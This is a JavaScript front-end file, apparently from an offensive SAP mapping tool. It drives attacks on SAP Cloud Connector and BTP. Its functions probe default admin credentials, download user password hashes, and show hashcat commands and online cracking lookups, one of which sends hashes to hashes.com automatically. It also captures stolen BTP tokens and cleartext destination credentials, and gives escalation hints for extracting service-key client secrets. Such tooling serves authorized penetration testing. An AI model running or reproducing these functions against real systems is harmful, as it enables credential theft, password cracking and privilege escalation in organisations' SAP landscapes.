      <div style="font-size:11px;color:#8b949e;font-family:monospace;word-break:break-all">${escHtml(d.url || '')}</div>
      <div style="font-size:11px;color:#8b949e">Auth: ${escHtml(d.authentication || '?')}${d.user ? ' · User: ' + escHtml(d.user) : ''}</div>
      ${pwBlock}
      ${flags.length ? '<div style="font-size:11px;margin-top:4px">' + flags.join(' · ') + '</div>' : ''}
    </div>`;
  }).join('');
  panel.innerHTML = `
    <span class="close-btn" onclick="_closeDetailPanel()">&times;</span>
    <h3>&#9729; BTP Subaccount — ${escHtml(bn.display_name || bn.subdomain || uuid.slice(0, 8))}</h3>
    ${renderPhaseProgress(getBTPPhaseProgress(bn))}
    <div class="detail-section">
      <div class="detail-row"><span class="detail-key">UUID</span><span class="detail-val" style="font-family:monospace;font-size:11px;word-break:break-all">${escHtml(uuid)}</span></div>
      <div class="detail-row"><span class="detail-key">Region</span><span class="detail-val">${escHtml(bn.region || '?')}</span></div>
      <div class="detail-row"><span class="detail-key">Subdomain</span><span class="detail-val">${escHtml(bn.subdomain || '?')}</span></div>
      <div class="detail-row"><span class="detail-key">Global account</span><span class="detail-val">${escHtml(bn.parent_global_account || '—')}</span></div>
      <div class="detail-row"><span class="detail-key">Pwned</span><span class="detail-val">${bn.pwned ? '<span style="color:#f0883e">&#9889; YES</span>' : 'No'}</span></div>
      <div class="detail-row"><span class="detail-key">Enumerated by</span><span class="detail-val">${escHtml(bn.enumerated_via_user || bn.enumerated_via_email || '?')}</span></div>
      <div class="detail-row"><span class="detail-key">Enumerated at</span><span class="detail-val" style="font-size:11px">${escHtml(bn.enumerated_at || '?')}</span></div>
    </div>
    <div class="detail-section">
      <h4>Destinations <span style="color:#8b949e;font-weight:normal;font-size:10px">(${dests.length} total · ${cleartext.length} cleartext · ${linked.length} linked)</span></h4>
      ${destRows || '<div style="color:#8b949e;font-size:11px">No destinations captured.</div>'}
    </div>
  `;
  panel.classList.add('visible');
  if (refresh && preservedScroll) panel.scrollTop = preservedScroll;
}

async function sccProbeCreds(host) {
  if (!confirm('Probe default Cloud Connector credentials (Administrator/manage)?\n\n' +
               'Sends ONE login POST.  A failed login is logged on the SCC and may ' +
               'increment a lockout counter for the Administrator account.')) return;
  try {
    flashActivity('SCC ' + host + ': probing creds', 8000);
    const r = await fetch('/api/scc/' + encodeURIComponent(host) + '/probe_creds',
                          { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: '{}' });
    const d = await r.json();
    if (d.error) alert('Probe failed: ' + d.error);
  } catch (e) { alert('Probe error: ' + e); }
}

async function sccPullMappings(host) {
  const stored = _sccStoredCreds(host);
  const defUser = (stored && stored.username) ? stored.username : 'Administrator';
  const defPass = (stored && stored.password) ? stored.password : '';
  const u = prompt('SCC admin username for ' + host + ':', defUser);
  if (!u) return;
  const p = prompt('Password for ' + u + ':', defPass);
  if (p === null) return;
  try {
    flashActivity('SCC ' + host + ': pulling mappings', 12000);
    const r = await fetch('/api/scc/' + encodeURIComponent(host) + '/pull_mappings',
                          { method: 'POST', headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ username: u, password: p }) });
    const d = await r.json();
    if (d.error) alert('Pull failed: ' + d.error);
  } catch (e) { alert('Pull error: ' + e); }
}

async function sccDownloadHashes(host) {
  console.log(`[*] Fetching SCC password hashes from ${host}`);
  let r;
  try {
    r = await fetch(`/api/scc/${encodeURIComponent(host)}/download_user_hashes`,
                    {method:'POST', headers:{'Content-Type':'application/json'},
                     body:JSON.stringify({})});
    r = await r.json();
  } catch(e) { console.error('[SCC hashes] Request failed:', e); return; }

  if (!r.ok) { console.error('[SCC hashes] Failed:', r.error||'unknown'); return; }

  const modal = document.getElementById('scc-hashes-modal');
  document.getElementById('scc-hashes-source').textContent =
    'Source: ' + (r.source || 'unknown');

  // Build hash table
  const users = r.users || [];
  let tbl = '<table style="width:100%;border-collapse:collapse;font-size:12px;font-family:monospace">' +
    '<tr style="color:#8b949e;border-bottom:1px solid #30363d">' +
    '<th style="text-align:left;padding:4px 8px">User</th>' +
    '<th style="text-align:left;padding:4px 8px">Algo</th>' +
    '<th style="text-align:left;padding:4px 8px">Roles</th>' +
    '<th style="text-align:left;padding:4px 8px">Hash:Salt (hex)</th></tr>';
  for (const u of users) {
    const line = u.hashcat_line || (u.hash_hex ? u.hash_hex + ':' + u.salt_hex : '(no hash)');
    tbl += `<tr style="border-bottom:1px solid #21262d">
      <td style="padding:4px 8px;color:#e6edf3">${escHtml(u.username)}</td>
      <td style="padding:4px 8px;color:${u.algorithm==='SHA-1'?'#f0883e':'#3fb950'}">${escHtml(u.algorithm||'?')}</td>
      <td style="padding:4px 8px;color:#8b949e">${escHtml(u.roles||'')}</td>
      <td style="padding:4px 8px;color:#79c0ff;word-break:break-all">${escHtml(line)}</td></tr>`;
  }
  tbl += '</table>';
  document.getElementById('scc-hashes-table').innerHTML = tbl;

  // Hashcat commands + online rainbow table tip
  const cmds = r.hashcat_commands || [];
  let cmdHtml = '<div style="margin-top:8px;padding:8px 10px;background:#161b22;border:1px solid #30363d;border-radius:4px;font-size:12px">' +
    '&#127760; <b style="color:#e6edf3">Quick win:</b> paste the hash value (left of the colon) directly into ' +
    '<a href="https://crackstation.net" target="_blank" style="color:#58a6ff">crackstation.net</a> — ' +
    'it checks against billions of pre-computed SHA-1 and SHA-256 entries instantly, no GPU needed.' +
    '</div>';
  if (cmds.length) {
    cmdHtml += '<div style="margin-top:8px"><div style="color:#8b949e;font-size:11px;margin-bottom:4px">Offline brute-force (hashcat):</div>' +
      cmds.map(c => `<pre style="background:#161b22;padding:8px;border-radius:4px;font-size:11px;color:#e6edf3;margin:0 0 6px;overflow-x:auto">${escHtml(c)}</pre>`).join('') +
      '</div>';
  }
  document.getElementById('scc-hashes-cmds').innerHTML = cmdHtml;

  // Store hash lines for copy button and users for online lookup
  modal._hashLines = users.filter(u=>u.hashcat_line).map(u=>u.hashcat_line);
  modal._users = users;
  modal.dataset.host = host;
  modal.classList.add('visible');

  // Sync the auto-lookup checkbox to the persisted preference
  const autoCb = document.getElementById('hashes-auto-lookup-cb');
  if (autoCb) autoCb.checked = getAutoLookupHashes();

  // Auto-lookup if API key is set and the user hasn't disabled the toggle.
  // Skip when there are zero crackable hashes — nothing to look up.
  if (getAutoLookupHashes() && (modal._users || []).some(u => u.hash_hex)) {
    try {
      const settings = await fetch('/api/settings/local').then(r => r.json());
      if (settings && settings.hashes_com_api_key_set) {
        console.log(`[*] auto-lookup: firing hashes.com query for ${host}`);
        sccLookupHashesOnline();
      } else {
        console.log('[*] auto-lookup: skipped — no hashes.com API key set');
      }
    } catch (e) {
      console.log('[*] auto-lookup: skipped — settings probe failed:', e);
    }
  }
}

// =====================================================================
// BTP — token paste, subaccount enumeration, destination capture
// =====================================================================

async function showBtpTokenModal() {
  const m = document.getElementById('btp-token-modal');
  document.getElementById('btp-token-input').value = '';
  // Show currently-stored tokens (regions only — never the token itself)
  let regions = [];
  try {
    const r = await fetch('/api/btp/regions').then(r => r.json());
    regions = r.regions || [];
  } catch (e) { /* ignore */ }
  const status = document.getElementById('btp-token-status');
  if (regions.length) {
    status.innerHTML =
      '<div style="background:#161b22;border:1px solid #30363d;border-radius:6px;'
      + 'padding:8px 10px;font-size:11px">'
      + '<div style="color:#3fb950">Tokens currently stored for: '
      + regions.map(r => '<code>' + escHtml(r) + '</code>').join(', ')
      + '</div></div>';
  } else {
    status.innerHTML =
      '<div class="muted" style="padding:6px;font-size:11px">No BTP tokens '
      + 'stored yet — paste one above.</div>';
  }
  m.classList.add('visible');
}

async function btpStoreToken() {
  const tok = (document.getElementById('btp-token-input').value || '').trim();
  if (!tok) {
    showToast('Paste a token first.', {autoCloseMs: 4000});
    return;
  }
  let r;
  try {
    r = await fetch('/api/btp/set_token', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({token: tok}),
    }).then(r => r.json());
  } catch (e) {
    showToast('Token validation request failed: ' + e, {autoCloseMs: 6000});
    return;
  }
  const status = document.getElementById('btp-token-status');
  if (!r.ok) {
    // user-select:text + cursor:text so the operator can copy the
    // error message (often contains the iss claim or an HTTP body
    // that's worth pasting into a search / bug report).
    status.innerHTML =
      '<div style="background:#fef0f0;border:1px solid #f5b5b5;color:#b51c1c;'
      + 'padding:8px 10px;border-radius:6px;font-size:12px;'
      + 'user-select:text;-webkit-user-select:text;cursor:text;'
      + 'word-break:break-word;font-family:monospace">'
      + escHtml(r.error || 'unknown error') + '</div>';
    return;
  }
  // Wipe the textarea — token is server-side now, no need to keep DOM copy
  document.getElementById('btp-token-input').value = '';
  // Token kind drives which action button to show.  cf -> Enumerate
  // (lists CF orgs/spaces).  destination -> Pull destinations
  // directly (single bound subaccount).  subaccount -> Enumerate
  // (lists every subaccount the token reaches).
  const kindLabel = {
    'cf':           'Cloud Foundry user token',
    'destination':  'Destination-service token',
    'connectivity': 'Connectivity-service token',
    'xsuaa':        'XSUAA service token',
    'subaccount':   'Subaccount-admin / global-account token',
    'other':        'Unrecognised',
    'unknown':      'Unknown',
  }[r.kind] || r.kind || 'Unknown';
  const kindColour = {
    'destination': '#3fb950',
    'subaccount':  '#3fb950',
    'cf':          '#0969da',
    'other':       '#d4a72c',
  }[r.kind] || '#8b949e';

  status.innerHTML =
    '<div style="background:#dafbe1;border:1px solid #b5e0b5;color:#1a7f37;'
    + 'padding:8px 10px;border-radius:6px;font-size:12px;'
    + 'user-select:text;-webkit-user-select:text;cursor:text">'
    + '<b>✓ Token stored</b> (region <code>' + escHtml(r.region) + '</code>'
    + ', user <b>' + escHtml(r.user || '?') + '</b>'
    + ', fingerprint <code>' + escHtml(r.fingerprint) + '</code>'
    + ', expires in ' + (r.expires_in_seconds || 0) + ' s'
    + (r.expired ? ' — <b style="color:#b51c1c">ALREADY EXPIRED</b>' : '')
    + ')</div>'
    // Kind banner — explains what THIS token can do
    + '<div style="margin-top:8px;padding:8px 10px;border-radius:6px;'
    + 'border:1px solid ' + kindColour + ';background:#1f2329;'
    + 'color:#c9d1d9;font-size:11px;user-select:text;-webkit-user-select:text">'
    + '<b style="color:' + kindColour + '">Token kind:</b> '
    + escHtml(kindLabel)
    + (r.bound_subaccount_uuid
        ? '<br><span class="muted">Bound subaccount:</span> <code>'
          + escHtml(r.bound_subaccount_uuid) + '</code>'
          + (r.subdomain ? ' (' + escHtml(r.subdomain) + ')' : '')
        : '')
    + '<br><span class="muted">' + escHtml(r.kind_description || '')
    + '</span></div>'
    // Kind-aware action button
    + (r.kind === 'destination'
        ? '<div style="margin-top:10px"><button class="btn btn-primary" '
          + 'onclick="btpPullForToken(\'' + escHtml(r.region) + '\')">'
          + 'Pull destinations (capture cleartext)</button></div>'
        : '<div style="margin-top:10px"><button class="btn btn-primary" '
          + 'onclick="btpEnumerate(\'' + escHtml(r.region) + '\')">'
          + 'Enumerate ' + escHtml(r.region) + '</button></div>');
  showToast(
    '<b>✓ BTP token stored</b><div style="font-size:11px;color:#8b949e;'
    + 'margin-top:4px">Region: ' + escHtml(r.region)
    + ' · User: ' + escHtml(r.user || '?') + '</div>',
    {autoCloseMs: 8000});
}

async function btpClearTokens() {
  if (!confirm('Clear ALL stored BTP tokens? This wipes them from process memory.'))
    return;
  await fetch('/api/btp/clear_token', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({}),
  });
  document.getElementById('btp-token-status').innerHTML =
    '<div class="muted" style="padding:6px;font-size:11px">All BTP tokens '
    + 'cleared.</div>';
  showToast('BTP tokens cleared.', {autoCloseMs: 4000});
}

// ---- BTP Connectivity-Proxy override (helper for PP live probe) ----
async function showBtpProxyModal() {
  const m = document.getElementById('btp-proxy-modal');
  document.getElementById('btp-proxy-status').innerHTML = '';
  document.getElementById('btp-proxy-auth-input').value = '';
  let current = '';
  let authPresent = false;
  try {
    const r = await fetch('/api/btp/proxy_override',
                          {method: 'GET'}).then(r => r.json());
    current = (r && r.proxy_host) || '';
    authPresent = !!(r && r.proxy_auth_token_present);
  } catch (_) { /* network blip — keep defaults */ }
  document.getElementById('btp-proxy-input').value =
    current || 'localhost:20003';
  if (authPresent) {
    document.getElementById('btp-proxy-auth-input').placeholder =
      'A connectivity-service token IS already stored (not shown for safety). '
      + 'Paste a new one to replace it, or use Clear all.';
  }
  const bits = [];
  if (current)
    bits.push('Proxy host:port: <code>' + escHtml(current) + '</code>');
  if (authPresent)
    bits.push('Connectivity-service token: stored');
  if (bits.length) {
    document.getElementById('btp-proxy-status').innerHTML =
      '<div style="color:#3fb950">&#10004; Active: '
      + bits.join('; ') + '</div>';
  } else {
    document.getElementById('btp-proxy-status').innerHTML =
      '<div style="color:#8b949e">Nothing set — probe will use the '
      + 'internal BTP proxy hostname AND the user JWT for proxy auth '
      + '(likely HTTP 407 from outside BTP).</div>';
  }
  m.classList.add('visible');
}

async function btpStoreProxyOverride() {
  const host = (document.getElementById('btp-proxy-input').value || '').trim();
  const auth = (document.getElementById('btp-proxy-auth-input').value || '').trim();
  if (!host && !auth) {
    document.getElementById('btp-proxy-status').innerHTML =
      '<div style="color:#f0883e">Enter a host:port and/or a '
      + 'connectivity-service JWT.</div>';
    return;
  }
  const body = {};
  if (host) body.proxy_host = host;
  if (auth) body.proxy_auth_token = auth;
  const r = await fetch('/api/btp/proxy_override', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify(body),
  }).then(r => r.json());
  if (r && r.ok) {
    const lines = [];
    if (r.proxy_host)
      lines.push('proxy host: <code>' + escHtml(r.proxy_host) + '</code>');
    if (r.proxy_auth_token_present)
      lines.push('connectivity-service token: stored');
    document.getElementById('btp-proxy-status').innerHTML =
      '<div style="color:#3fb950">&#10004; Saved &middot; '
      + lines.join('; ') + '</div>';
    document.getElementById('btp-proxy-auth-input').value = '';  // don't leave plaintext in the field
    showToast('PP-probe settings saved', {autoCloseMs: 4000});
  } else {
    document.getElementById('btp-proxy-status').innerHTML =
      '<div style="color:#f85149">Failed: ' + escHtml((r && r.error) || '?')
      + '</div>';
  }
}

async function btpClearProxyOverride() {
  await fetch('/api/btp/proxy_override',
              {method: 'DELETE'}).then(r => r.json());
  document.getElementById('btp-proxy-input').value = '';
  document.getElementById('btp-proxy-auth-input').value = '';
  document.getElementById('btp-proxy-status').innerHTML =
    '<div style="color:#8b949e">All cleared.</div>';
  showToast('PP-probe proxy override + auth token cleared.',
            {autoCloseMs: 4000});
}

async function btpPullForToken(region) {
  // Direct destination-pull for destination-service-scoped tokens.
  // The token IS the subaccount (via ext_attr.subaccountid claim) —
  // no enumeration step needed.  Server extracts the bound subaccount
  // UUID, calls /destinations, captures cleartext, links to on-prem.
  showToast('<b>Pulling destinations…</b>'
            + '<div style="font-size:11px;color:#8b949e;margin-top:4px">'
            + 'Per-destination "find" call to materialise cleartext '
            + 'where AccessClientSecrets is granted.</div>',
            {autoCloseMs: 5000});
  let r;
  try {
    r = await fetch('/api/btp/pull_destinations_for_token', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({region}),
    }).then(r => r.json());
  } catch (e) {
    showToast('Pull destinations failed: ' + e, {autoCloseMs: 6000});
    return;
  }
  if (!r.ok) {
    showToast('Pull destinations failed: ' + (r.error || '?'),
              {autoCloseMs: 8000});
    return;
  }
  const captured = r.cleartext_captured || 0;
  const linked = r.linked_to_onprem || 0;
  const prdTargets = r.prd_targets || 0;
  const colour = (captured && prdTargets) ? '#f85149'
                : (captured ? '#db6d28' : '#3fb950');
  showToast(
    '<b style="color:' + colour + '">'
    + escHtml(r.subdomain || r.subaccount_uuid) + '</b>'
    + '<div style="font-size:12px;margin-top:6px">'
    + r.destinations + ' destination(s) · '
    + '<b>' + captured + '</b> cleartext captured · '
    + '<b>' + linked + '</b> linked to on-prem'
    + (prdTargets ? ' · <b style="color:#f85149">'
        + prdTargets + ' reach PRD</b>' : '') + '</div>'
    + '<div style="font-size:10px;color:#8b949e;margin-top:6px">'
    + 'Captured creds added to the matching SAPNode.credentials. '
    + 'Synthetic RFC edges drawn BTP→on-prem so trust-chain analysis '
    + 'walks them.</div>',
    {autoCloseMs: 14000});
  if (typeof refreshState === 'function') refreshState();
  else if (typeof updateMap === 'function') updateMap();
}

async function btpEnumerate(region) {
  showToast('<b>Enumerating BTP region ' + escHtml(region) + '…</b>',
            {autoCloseMs: 4000});
  let r;
  try {
    r = await fetch('/api/btp/enumerate', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({region}),
    }).then(r => r.json());
  } catch (e) {
    showToast('BTP enumeration failed: ' + e, {autoCloseMs: 6000});
    return;
  }
  if (!r.ok) {
    showToast('BTP enumeration failed: ' + (r.error || '?'),
              {autoCloseMs: 8000});
    return;
  }
  // Render a quick summary inline in the token modal
  const cf = r.cf_topology || {};
  const orgs = cf.orgs || [], spaces = cf.spaces || [],
        apps = cf.apps || [], sis = cf.service_instances || [],
        hints = cf.escalation_hints || [];

  let html = '<div style="background:#161b22;border:1px solid #30363d;'
    + 'border-radius:6px;padding:10px;margin-top:10px;font-size:12px;'
    + 'color:#c9d1d9;user-select:text;-webkit-user-select:text">';

  // Scope warnings (always render first so the operator sees them)
  if ((r.scope_warnings || []).length) {
    html += '<div style="background:#fff8c5;color:#7d4e00;'
      + 'border:1px solid #d4a72c;border-radius:4px;padding:8px 10px;'
      + 'margin-bottom:10px;font-size:11px">'
      + '<b>⚠️ Token-scope limitations</b><br>';
    for (const w of r.scope_warnings) {
      // Backticks → <code>, \n → <br>, "  N. " → indented bullets
      // so multi-step recipes (e.g. how to mint a destination token)
      // render as a readable list rather than one wall of text.
      const rendered = escHtml(w)
        .replace(/`([^`]+)`/g, '<code>$1</code>')
        .replace(/\n/g, '<br>');
      html += '• ' + rendered + '<br>';
    }
    html += '</div>';
  }

  // BTP-side block (subaccounts + SCC mappings)
  html += '<div style="font-weight:600;margin-bottom:6px;color:'
    + (r.subaccount_count > 0 ? '#3fb950' : '#8b949e') + '">'
    + (r.subaccount_count > 0 ? '✓' : 'ℹ︎')
    + ' BTP control plane: ' + r.subaccount_count + ' subaccount(s), '
    + r.scc_mapping_count + ' SCC mapping(s)</div>';
  if (r.subaccount_count === 0) {
    html += '<div style="color:#8b949e;font-style:italic;font-size:11px;'
      + 'margin-bottom:8px">'
      + '0 subaccounts is normal for a stock `cf oauth-token`. '
      + 'See scope warning above for how to escalate.</div>';
  }
  for (const s of (r.subaccounts || [])) {
    html += '<div style="padding:6px 0;border-top:1px solid #30363d;'
      + 'display:flex;justify-content:space-between;align-items:center;gap:8px">'
      + '<div><b>' + escHtml(s.display_name || s.uuid)
      + '</b> <span class="muted">'
      + '· <code>' + escHtml(s.uuid.substring(0, 8))
      + '…</code> · ' + s.scc_mappings + ' SCC tunnel(s)</span></div>'
      + '<button class="btn" style="padding:3px 10px;font-size:11px" '
      + 'onclick="btpPullDestinations(\'' + escHtml(s.uuid) + '\',\''
      + escHtml(s.display_name || s.uuid) + '\')">Pull destinations</button>'
      + '</div>';
  }

  // Cloud Foundry topology — what the cf-scoped token CAN see.
  if (orgs.length || spaces.length || apps.length || sis.length) {
    html += '<div style="margin-top:14px;padding-top:10px;'
      + 'border-top:1px solid #30363d;font-weight:600;color:#58a6ff">'
      + '☁️ Cloud Foundry topology (visible via <code>cloud_controller.read</code>)</div>';
    html += '<div style="font-size:11px;color:#c9d1d9;margin-top:4px">'
      + '<b>' + orgs.length + '</b> org' + (orgs.length === 1 ? '' : 's') + ' · '
      + '<b>' + spaces.length + '</b> space' + (spaces.length === 1 ? '' : 's') + ' · '
      + '<b>' + apps.length + '</b> app' + (apps.length === 1 ? '' : 's') + ' · '
      + '<b>' + sis.length + '</b> service instance' + (sis.length === 1 ? '' : 's')
      + '</div>';
    if (orgs.length) {
      html += '<div style="margin-top:6px;font-size:11px"><span class="muted">Orgs:</span> '
        + orgs.map(o => '<code>' + escHtml(o.name || o.guid) + '</code>').join(', ')
        + '</div>';
    }
    if (spaces.length && spaces.length <= 30) {
      html += '<div style="margin-top:4px;font-size:11px"><span class="muted">Spaces:</span> '
        + spaces.map(s => '<code>' + escHtml(s.name || s.guid) + '</code>').join(', ')
        + '</div>';
    }
    if (apps.length && apps.length <= 30) {
      html += '<div style="margin-top:4px;font-size:11px"><span class="muted">Apps:</span> '
        + apps.map(a => '<code>' + escHtml(a.name)
            + (a.state && a.state !== 'STARTED' ? ':' + a.state.toLowerCase() : '')
            + '</code>').join(', ')
        + '</div>';
    }
    if (sis.length && sis.length <= 40) {
      html += '<div style="margin-top:4px;font-size:11px"><span class="muted">Service instances:</span> '
        + sis.map(s => '<code>' + escHtml(s.name) + '</code>').join(', ')
        + '</div>';
    }

    // Escalation hints — likely Destination / Connectivity / XSUAA
    // bindings whose client_id+client_secret can mint a higher-
    // scoped token.
    if (hints.length) {
      html += '<div style="margin-top:10px;background:#1f1a0e;'
        + 'border:1px solid #db6d28;border-radius:4px;padding:8px 10px;'
        + 'font-size:11px;color:#f0883e">'
        + '<b>⚡ Escalation hints (' + hints.length + ')</b><br>'
        + '<span style="color:#c9d1d9">These service instances likely '
        + 'host credentials that mint higher-scoped BTP tokens.  '
        + 'Run <code>cf service-key &lt;name&gt; &lt;keyname&gt;</code> '
        + 'to extract their client_id / client_secret, then exchange '
        + 'at XSUAA for a token with destination_configuration.'
        + 'ApiAccess.</span><ul style="margin:6px 0 0 16px;padding:0">';
      for (const h of hints) {
        html += '<li><code>' + escHtml(h.service_instance_name)
          + '</code></li>';
      }
      html += '</ul></div>';
    }
  }

  // Bubble up any HTTP errors from the CF/BTP probes
  if ((cf.errors || []).length) {
    html += '<div style="margin-top:8px;font-size:10px;color:#8b949e">'
      + '<b>Probe errors:</b><br>'
      + cf.errors.map(e => '• ' + escHtml(e)).join('<br>')
      + '</div>';
  }

  html += '</div>';
  document.getElementById('btp-token-status').innerHTML += html;
}

async function btpPullDestinations(uuid, displayName) {
  showToast('<b>Pulling destinations for '
            + escHtml(displayName) + '…</b>'
            + '<div style="font-size:11px;color:#8b949e;margin-top:4px">'
            + 'Per-destination "find" call to materialise cleartext where '
            + 'the token allows.</div>',
            {autoCloseMs: 5000});
  let r;
  try {
    r = await fetch('/api/btp/pull_destinations/' + encodeURIComponent(uuid),
                    {method: 'POST',
                     headers: {'Content-Type': 'application/json'},
                     body: '{}'})
      .then(r => r.json());
  } catch (e) {
    showToast('Pull destinations failed: ' + e, {autoCloseMs: 6000});
    return;
  }
  if (!r.ok) {
    showToast('Pull destinations failed: ' + (r.error || '?'),
              {autoCloseMs: 8000});
    return;
  }
  const captured = r.cleartext_captured || 0;
  const linked = r.linked_to_onprem || 0;
  const prdTargets = r.prd_targets || 0;
  const colour = (captured && prdTargets) ? '#f85149'
                : (captured ? '#db6d28' : '#3fb950');
  showToast(
    '<b style="color:' + colour + '">' + escHtml(displayName) + '</b>'
    + '<div style="font-size:12px;margin-top:6px">'
    + r.destinations + ' destination(s) · '
    + '<b>' + captured + '</b> cleartext captured · '
    + '<b>' + linked + '</b> linked to on-prem'
    + (prdTargets ? ' · <b style="color:#f85149">'
        + prdTargets + ' reach PRD</b>' : '') + '</div>'
    + '<div style="font-size:10px;color:#8b949e;margin-top:6px">'
    + 'Captured creds added to the matching SAPNode.credentials. '
    + 'Synthetic RFC edges drawn BTP→on-prem so trust-chain analysis '
    + 'walks them.</div>',
    {autoCloseMs: 14000});
  // If a state refresh function exists, kick it so the map redraws
  if (typeof refreshState === 'function') refreshState();
  else if (typeof updateMap === 'function') updateMap();
}

async function openDiffModal() {
  // Populate both dropdowns with the contents of states/ + an
  // in-memory option, then show the modal.
  let r;
  try {
    r = await fetch('/api/diff/list_states').then(r => r.json());
  } catch (e) {
    showToast('Could not list states/: ' + e, {autoCloseMs: 6000});
    return;
  }
  if (!r.ok) {
    showToast('Could not list states/: ' + (r.error || '?'),
              {autoCloseMs: 6000});
    return;
  }
  const baseSel = document.getElementById('diff-baseline');
  const currSel = document.getElementById('diff-current');
  baseSel.innerHTML = '';
  currSel.innerHTML = '';

  // In-memory option always available (most useful default for
  // "current") — paired with a "(pick a saved file)" placeholder for
  // baseline.
  const opts = [];
  opts.push({value: '__in_memory__',
              label: '(live, in-memory state)'});
  for (const f of (r.files || [])) {
    opts.push({value: f.path,
                label: `${f.name}  —  ${f.mtime}  (${f.size} bytes)`});
  }
  for (const o of opts) {
    const optB = document.createElement('option');
    optB.value = o.value; optB.textContent = o.label;
    baseSel.appendChild(optB);
    const optC = document.createElement('option');
    optC.value = o.value; optC.textContent = o.label;
    currSel.appendChild(optC);
  }

  // Sensible defaults: oldest saved file as baseline, in-memory as
  // current.
  if ((r.files || []).length > 0) {
    baseSel.value = r.files[r.files.length - 1].path;
  }
  currSel.value = '__in_memory__';

  document.getElementById('diff-result').innerHTML = '';
  document.getElementById('diff-modal').classList.add('visible');
}

async function runDiffCompute() {
  const base = document.getElementById('diff-baseline').value;
  const curr = document.getElementById('diff-current').value;
  if (!base || !curr) {
    showToast('Pick both baseline and current.', {autoCloseMs: 5000});
    return;
  }
  if (base === curr) {
    showToast('Baseline and current are the same — pick different snapshots.',
              {autoCloseMs: 5000});
    return;
  }
  const resDiv = document.getElementById('diff-result');
  resDiv.innerHTML = '<div class="muted" style="padding:8px">Computing diff…</div>';
  let r;
  try {
    r = await fetch('/api/diff/compute', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({baseline: base, current: curr}),
    });
    r = await r.json();
  } catch (e) {
    resDiv.innerHTML =
      '<div style="color:#f85149;padding:8px">Request failed: '
      + escHtml(String(e)) + '</div>';
    return;
  }
  if (!r.ok) {
    resDiv.innerHTML =
      '<div style="color:#f85149;padding:8px">Diff failed: '
      + escHtml(r.error || 'unknown') + '</div>';
    return;
  }
  const s = r.summary || {};
  resDiv.innerHTML =
    '<div style="background:#161b22;border:1px solid #30363d;'
    + 'border-radius:6px;padding:12px;font-size:12px;color:#c9d1d9">'
    + '<div style="color:#3fb950;font-weight:600;margin-bottom:8px">'
    + '✓ Diff written</div>'
    + '<div style="display:grid;grid-template-columns:auto 1fr;'
    + 'gap:4px 12px;font-family:monospace;font-size:11px">'
    + '<div style="color:#8b949e">Newly pwned:</div>'
    + '<div>' + (s.newly_pwned_count || 0)
    + (s.newly_pwned_sids && s.newly_pwned_sids.length
        ? ' — ' + escHtml(s.newly_pwned_sids.join(', ')) : '') + '</div>'
    + '<div style="color:#8b949e">New CRITICAL findings:</div>'
    + '<div>' + (s.newly_critical || 0) + '</div>'
    + '<div style="color:#8b949e">New chains → PRD:</div>'
    + '<div>' + (s.new_chains_to_prd || 0) + '</div>'
    + '<div style="color:#8b949e">Findings added:</div>'
    + '<div>' + (s.findings_added || 0) + '</div>'
    + '<div style="color:#8b949e">Findings remediated:</div>'
    + '<div>' + (s.findings_removed || 0) + '</div>'
    + '<div style="color:#8b949e">Nodes added/removed:</div>'
    + '<div>' + (s.nodes_added || 0) + ' / '
    + (s.nodes_removed || 0) + '</div>'
    + '</div>'
    + '<div style="margin-top:10px;font-size:11px;'
    + 'word-break:break-all;color:#c9d1d9">'
    + '<b>HTML:</b> ' + escHtml(r.html_path) + '<br>'
    + '<b>Markdown:</b> ' + escHtml(r.md_path)
    + '</div>'
    + '<div style="color:#8b949e;font-size:10px;margin-top:6px">'
    + 'Open the HTML file in any browser for a presentable view.</div>'
    + '</div>';
}

// localStorage-backed toggle (default ON).  Persists across reloads so
// operators don't have to re-enable each session.
function getAutoLookupHashes() {
  const v = localStorage.getItem('sapmap.autoLookupHashes');
  // Default to true if nothing was stored.
  return v === null ? true : v === 'true';
}

function setAutoLookupHashes(on) {
  localStorage.setItem('sapmap.autoLookupHashes', on ? 'true' : 'false');
  console.log(`[*] auto-lookup on hashes.com: ${on ? 'enabled' : 'disabled'}`);
}

function sccHashesCopy() {
  const modal = document.getElementById('scc-hashes-modal');
  const lines = (modal._hashLines || []).join('\n');
  if (!lines) { showToast('No hashes to copy', 'warn'); return; }
  navigator.clipboard.writeText(lines).then(
    () => showToast('Hashes copied to clipboard', 'success'),
    () => showToast('Copy failed — select manually', 'error'));
}

async function showHashesApiKeyModal() {
  // Show current status before opening
  try {
    const s = await fetch('/api/settings/local').then(r => r.json());
    const info = document.getElementById('hashes-api-key-input');
    if (info) info.placeholder = s.hashes_com_api_key_set
      ? '(key already set — paste new key to replace)'
      : 'paste key here';
  } catch(e) {}
  document.getElementById('hashes-api-modal').classList.add('visible');
}

async function saveHashesApiKey() {
  const key = (document.getElementById('hashes-api-key-input').value || '').trim();
  if (!key) { alert('Please enter an API key'); return; }
  const r = await fetch('/api/settings/local', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({hashes_com_api_key: key})
  });
  const d = await r.json();
  if (d.ok) {
    showToast('hashes.com API key saved to settings.local.json', 'success');
    closeModal('hashes-api-modal');
  } else {
    showToast('Failed to save: ' + (d.error||'?'), 'error');
  }
}

async function showSdkPathModal() {
  // Preload the currently-stored value (if any) so the operator can
  // see what's active and edit rather than re-type from scratch.
  //
  // Two-value display: the input reflects what's persisted in
  // settings.local.json (what "Save" will write).  The info line
  // reflects what's ACTIVE in the running process — which may come
  // from --sdk on the CLI or the Docker entrypoint instead.
  //
  // Container-mode UX: when SAPMAP_IN_CONTAINER is set, swap the
  // help + input + Save for an informational banner.  The
  // entrypoint sets --sdk on every restart and settings.local.json
  // is ephemeral (lost on --rm), so there's nothing to persist.
  try {
    const s = await fetch('/api/settings/local').then(r => r.json());
    const inContainer = !!s.in_container;
    // Toggle container-mode UI vs edit-mode UI in one place.
    const help    = document.getElementById('sdk-path-help');
    const notice  = document.getElementById('sdk-path-container-notice');
    const nBody   = document.getElementById('sdk-path-container-body');
